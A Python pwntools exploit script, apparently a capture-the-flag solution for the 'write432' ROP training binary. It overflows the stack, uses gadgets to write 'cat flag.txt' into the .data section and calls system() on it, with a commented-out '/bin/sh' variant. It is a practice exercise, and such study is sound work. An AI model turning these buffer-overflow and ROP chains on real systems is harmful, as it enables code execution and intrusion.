#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./write432')
# context.terminal = ['tmux', 'splitw', '-h']
context.terminal = ['tmux', 'new-window']

host = args.HOST or ''
port = int(args.PORT or 8080)

def local(argv=[], *a, **kw):
    return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(argv, *a, **kw)
    else:
        return local(argv, *a, **kw)

# HELPER FUNCTIONS

# Pad string to be multiple of 4, put address we want to write at in edi, put part of string in ebp, call mov [edi], ebp
# Repeat until we write the whole string
def write(write_addr, string):
    MOV_EDI_EBP = exe.sym.usefulGadgets
    POP_EDI_EBP = 0x080486da 
    chain = ""
    if len(string) % 4 != 0:
        string = string + "\x00"*(4 - len(string) % 4)
    for i in range(0, len(string), 4):
        chain += p32(POP_EDI_EBP)
        chain += p32(WRITE_ADDR+i)
        chain += string[i:i+4] 
        chain += p32(MOV_EDI_EBP)
    return chain

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

if args.GEF:
    gdb.attach(io, gdb_args=['-q', '-ex', 'init-gef'], gdbscript='''
    ''')
    # pie breakpoint function+118

if args.PWNDBG:
    gdb.attach(io, gdb_args=['-q', '-ex', 'init-pwndbg'], gdbscript='''
    ''')
    # piebase 0x7f0

# Writeable sections (readelf -S):
# .init_array 08049f08 
# .fini_array 08049f0c
# .jcr        08049f10
# .dynamic    08049f14
# .got        08049ffc
# .got.plt    0804a000
# .data       0804a028 
# .bss        0804a040

WRITE_ADDR = 0x0804a028
SYSTEM_ADDR = exe.sym.system
# io.sendline(cyclic(1024))
OFFSET = cyclic_find(0x6161616c)
payload = "A" * OFFSET

# payload += write(WRITE_ADDR, "/bin/sh\x00")
payload += write(WRITE_ADDR, "cat flag.txt\x00")

payload += p32(SYSTEM_ADDR)
payload += "BBBB" # Don't care if it crashes
payload += p32(WRITE_ADDR)
io.sendline(payload)

io.interactive()

